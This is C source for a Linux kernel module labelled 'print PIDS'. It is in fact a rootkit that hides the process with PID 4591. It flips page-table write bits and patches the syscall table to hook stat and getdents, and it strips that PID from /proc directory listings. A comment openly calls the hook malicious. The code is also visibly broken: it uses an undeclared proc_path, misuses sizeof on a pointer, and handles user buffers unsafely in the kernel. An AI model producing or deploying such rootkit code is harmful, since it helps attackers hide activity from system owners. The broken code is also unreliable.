#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>

#define MAXPATH 150
#define PATT_PATH "/proc/"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tal");
MODULE_DESCRIPTION("print PIDS");

char path[MAXPATH];
char *pidpath="4591";

unsigned long kallsyms_lookup_addr;
unsigned long (*kallsyms_lookup_name)(const char *name);
unsigned long *sys_call_table;
asmlinkage int (*old_stat)(const struct pt_regs *regs);
asmlinkage int (*old_getdents)(const struct pt_regs *regs);

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
};

int set_addr_rw(unsigned long _addr){
    unsigned int level;
    pte_t *pte;
    pte = lookup_address(_addr, &level);

    if (pte->pte &~ _PAGE_RW) {
        pte->pte = (pte->pte) | _PAGE_RW;
    }

    return 0;
}

int set_addr_ro(unsigned long _addr){
    unsigned int level;
    pte_t *pte;
    pte = lookup_address(_addr, &level);

    pte->pte = (pte->pte) &~ _PAGE_RW;

    return 0;
}

void pid_path(void){
    strncpy(path, PATT_PATH, sizeof(PATT_PATH));
    strncat(path, pidpath,sizeof(pidpath));

}


asmlinkage int new_stat(const struct pt_regs *regs) {

	char *path = (char*) regs->di;
	
       // perform our malicious code here- the HOOK!
       if (strstr(path, proc_path) != NULL) {
	       
	       // inside the call to our hidden process, return error
	       return -1;
	}

        // executing the original stat handler
        return (*old_stat)(regs);
}

asmlinkage int new_getdents(const struct pt_regs *regs) {

    int ret;

    // the current structure
    struct linux_dirent *curr = (struct linux_dirent*)regs->si;

    int i = 0;

    ret = (*old_getdents)(regs);

	// going threw the entries, looking for our pid
    while (i < ret) {

		// checking if it is our process
        if (!strcmp(curr->d_name, pidpath)) {

            // length of this linux_dirent
            int reclen = curr->d_reclen;
            char *next = (char*)curr + reclen;
            int len = (int)regs->si + ret - (uintptr_t)next;
            memmove(curr, next, len);
            ret -= reclen;
            continue;
        }

    i += curr->d_reclen;
    curr = (struct linux_dirent*)((char*)regs->si + i);
    }

    return ret;
}
